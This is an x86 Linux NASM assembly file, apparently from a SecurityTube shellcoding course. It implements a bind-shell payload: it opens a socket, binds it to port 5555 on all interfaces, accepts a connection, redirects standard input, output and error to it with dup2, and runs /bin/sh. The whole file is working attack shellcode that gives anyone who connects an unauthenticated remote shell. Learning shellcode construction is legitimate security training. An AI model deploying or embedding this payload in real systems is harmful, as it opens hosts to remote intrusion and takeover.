; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

XOR EAX, EAX     ;zero out registers
XOR EBX, EBX
XOR ECX, ECX
XOR EDX, EDX

; setup int socket(AF_Net(2), SYS_SOCKET(1), 0);
MOV AX, 0x167   ; syscall for socket (359)
MOV BL, 0x2     ; the communication domain of AF_NET
MOV CL, 0x1     ; sys_socket
                ; EDX is already 0 for the protocol

INT 0x80         ; tell the kernel to execute the system call
                 ; EAX will be set to the socket file descriptor value (socketfd)
MOV EDI, EAX     ; store socketfd in EDI for use in other system calls


MOV EBX, EDI     ; move sockfd file descriptor to EBX

; setup sockaddr structure and place it into ECX
XOR EAX, EAX
XOR ECX, ECX
PUSH EAX           ;0 for INADDR_ANY
PUSH WORD 0xb315   ;port 5555
PUSH WORD 0x2      ;AF_INET 2
MOV ECX, ESP       ;set ECX to point to the sockaddr structure

MOV DL, 0x10       ;EDX is sizeof(struct sockaddr) in /usr/include/linux/in.h; 16
MOV AX, 0x169      ; BIND syscall 361 (0x169)
INT 0x80



; recreate the c code: listen(sockfd, 0);
; syscall listen = 363 (0x16B)
XOR EAX, EAX
MOV EBX, EDI    ; move sockfd file description to EBX
XOR ECX, ECX    ; zero ecx
MOV AX, 0x16B   ; put the listen interrupt into eax
INT 0x80        ; call interrupt


XOR EAX, EAX
MOV AX, 0x16c      ;syscall for accept(364)
MOV EBX, EDI       ;socketfd
XOR ECX, ECX       ;zero out ECX and EDX for the NULL parameters
XOR EDX, EDX

INT 0x80

MOV ESI, EAX       ;store the result of the accept call into ESI for DUP2 use

XOR EAX, EAX
MOV AL, 0x3F     ;syscall dup2 = 63
MOV EBX, ESI     ;move resultfd to ebx
MOV CL, 0x1
INT 0x80

XOR EAX, EAX
MOV AL, 0x3F     ;syscall dup2 = 63
MOV EBX, ESI     ;move resultfd to ebx
MOV CL, 0x2
INT 0x80

XOR EAX, EAX
MOV AL, 0x3F     ;syscall dup2 = 63
MOV EBX, esi     ;move resultfd to ebx
MOV CL, 0x0
INT 0x80



XOR EAX, EAX
PUSH EAX            ;push string terminator/NULL
MOV AL,0xb          ;syscall for execve
PUSH 0x68732f6e ; hs/n
PUSH 0x69622f2f ; ib//
MOV  EBX, ESP       ;set EBX parameter of execve
INT  0x80           ;execute the syscall

